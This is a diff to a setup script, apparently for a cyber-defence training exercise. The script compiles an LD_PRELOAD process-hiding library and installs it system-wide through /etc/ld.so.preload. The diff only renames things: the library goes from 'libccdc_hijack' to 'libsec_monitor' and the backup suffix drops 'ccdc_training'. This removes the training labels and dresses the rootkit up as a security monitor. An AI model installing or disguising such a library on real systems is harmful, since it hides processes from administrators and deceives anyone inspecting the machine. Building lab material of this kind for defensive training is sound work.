@@ -57,10 +57,10 @@ echo ""
 # Step 1: Write the C source for the process-hiding library
 echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD process-hiding library source...${NC}"
 
-PRELOAD_SOURCE_DIR="/tmp/preload_src"
+PRELOAD_SOURCE_DIR="/tmp/lib_build"
 mkdir -p "$PRELOAD_SOURCE_DIR"
 
-cat > "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" << 'CSRC'
+cat > "$PRELOAD_SOURCE_DIR/libsec_monitor.c" << 'CSRC'
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <dlfcn.h>
@@ -132,7 +132,7 @@ DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 CSRC
 
-echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libccdc_hijack.c${NC}"
+echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libsec_monitor.c${NC}"
 echo -e "${GREEN}    (based on github.com/gianlucaborello/libprocesshider)${NC}"
 
 # Step 2: Install GCC if not present
@@ -169,12 +169,12 @@ fi
 echo -e "${YELLOW}[*] Step 3: Compiling LD_PRELOAD library...${NC}"
 
 if command -v gcc &> /dev/null; then
-    if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" \
-        "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" -ldl 2>/dev/null; then
-        echo -e "${GREEN}[+] Successfully compiled libccdc_hijack.so${NC}"
-        if cp "$PRELOAD_SOURCE_DIR/libccdc_hijack.so" "$LIB_PATH/libccdc_hijack.so"; then
-            chmod 644 "$LIB_PATH/libccdc_hijack.so"
-            echo -e "${GREEN}[+] Installed to $LIB_PATH/libccdc_hijack.so${NC}"
+    if gcc -fPIC -shared -o "$PRELOAD_SOURCE_DIR/libsec_monitor.so" \
+        "$PRELOAD_SOURCE_DIR/libsec_monitor.c" -ldl 2>/dev/null; then
+        echo -e "${GREEN}[+] Successfully compiled libsec_monitor.so${NC}"
+        if cp "$PRELOAD_SOURCE_DIR/libsec_monitor.so" "$LIB_PATH/libsec_monitor.so"; then
+            chmod 644 "$LIB_PATH/libsec_monitor.so"
+            echo -e "${GREEN}[+] Installed to $LIB_PATH/libsec_monitor.so${NC}"
         else
             echo -e "${YELLOW}[!] Could not copy compiled library to $LIB_PATH${NC}"
         fi
@@ -191,12 +191,12 @@ echo -e "${YELLOW}[*] Step 4: Setting up /etc/ld.so.preload...${NC}"
 LD_PRELOAD_FILE="/etc/ld.so.preload"
 
 if [ -f "$LD_PRELOAD_FILE" ]; then
-    cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.backup.ccdc_training"
+    cp "$LD_PRELOAD_FILE" "${LD_PRELOAD_FILE}.bak"
     echo -e "${GREEN}[+] Backed up existing /etc/ld.so.preload${NC}"
 fi
 
-if [ -f "$LIB_PATH/libccdc_hijack.so" ]; then
-    echo "$LIB_PATH/libccdc_hijack.so" > "$LD_PRELOAD_FILE"
+if [ -f "$LIB_PATH/libsec_monitor.so" ]; then
+    echo "$LIB_PATH/libsec_monitor.so" > "$LD_PRELOAD_FILE"
     chmod 644 "$LD_PRELOAD_FILE"
     echo -e "${GREEN}[+] Updated /etc/ld.so.preload${NC}"
 else
@@ -208,7 +208,7 @@ echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}LD_PRELOAD Training Module Setup Complete!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo ""
-echo -e "${BLUE}Library:${NC}             $LIB_PATH/libccdc_hijack.so"
+echo -e "${BLUE}Library:${NC}             $LIB_PATH/libsec_monitor.so"
 echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
 echo ""
 echo -e "${YELLOW}Effect:${NC}"
